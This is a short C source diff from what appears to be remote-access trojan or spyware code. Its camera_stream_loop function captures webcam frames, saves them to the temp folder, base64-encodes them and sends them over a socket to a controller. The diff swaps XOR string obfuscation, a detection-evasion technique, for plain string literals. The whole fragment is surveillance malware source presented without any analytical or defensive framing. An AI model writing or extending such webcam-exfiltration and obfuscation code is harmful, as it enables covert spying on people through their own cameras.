@@ -79,7 +79,7 @@ void camera_stream_loop(SOCKET sock, HANDLE mutex, HANDLE stop_event, int fps) {
 
             char tmp[MAX_PATH];
             GetTempPathA(MAX_PATH, tmp);
-            strcat(tmp, xor_str(_S("cam.jpg")));
+            strcat(tmp, "cam.jpg");
             stbi_write_jpg(tmp, w, h, 3, pData, 60);
 
             pBuffer->lpVtbl->Unlock(pBuffer);
@@ -101,7 +101,7 @@ void camera_stream_loop(SOCKET sock, HANDLE mutex, HANDLE stop_event, int fps) {
                 free(jpg_data);
 
                 char* msg = malloc(b64_len + 32);
-                sprintf(msg, xor_str(_S("[cam_frame]%s")), b64);
+                sprintf(msg, "[cam_frame]%s", b64);
                 sock_send(sock, mutex, msg);
                 free(msg); free(b64);
             }
